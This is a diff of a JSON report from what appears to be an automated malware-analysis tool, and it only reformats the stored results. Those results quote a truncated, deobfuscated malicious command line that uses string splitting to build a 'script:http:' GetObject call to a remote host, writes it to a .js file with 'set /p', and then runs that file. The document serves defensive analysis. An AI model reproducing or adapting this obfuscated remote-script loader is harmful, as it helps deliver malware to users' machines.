@@ -5,7 +5,9 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"Number of line after deobfuscation\": 6}",
+        "body": {
+          "Number of line after deobfuscation": 6
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -18,13 +20,19 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Complexe One-Liner",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"Filename\": \"C:\\\\BT59TX5\\\\BT59TX5.jS\", \"Command [trunc]\": \"/p K1J0=\\\"var C66d=\\\"sc\\\"+\\\"r\\\" D66d=\\\"ip\\\"+\\\"t:h\\\" E66d=\\\"T\\\"+\\\"tP\\\"+\\\":\\\" GetObject(C66d+D66d+E66d+'//n7eo5j.real\"}]",
+        "body": [
+          {
+            "Command [trunc]": "/p K1J0=\"var C66d=\"sc\"+\"r\" D66d=\"ip\"+\"t:h\" E66d=\"T\"+\"tP\"+\":\" GetObject(C66d+D66d+E66d+'//n7eo5j.real",
+            "Filename": "C:\\BT59TX5\\BT59TX5.jS"
+          }
+        ],
         "body_config": {
           "column_order": [
             "Filename",
@@ -42,13 +50,19 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "File creation using set /p",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"Filename\": \"c:\\\\bt59tx5\\\\bt59tx5.js\", \"Command\": \"c:\\\\bt59tx5\\\\bt59tx5.js\"}]",
+        "body": [
+          {
+            "Command": "c:\\bt59tx5\\bt59tx5.js",
+            "Filename": "c:\\bt59tx5\\bt59tx5.js"
+          }
+        ],
         "body_config": {
           "column_order": [
             "Filename",
@@ -66,6 +80,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Execution of manipulated content",
         "zeroize_on_tag_safe": false
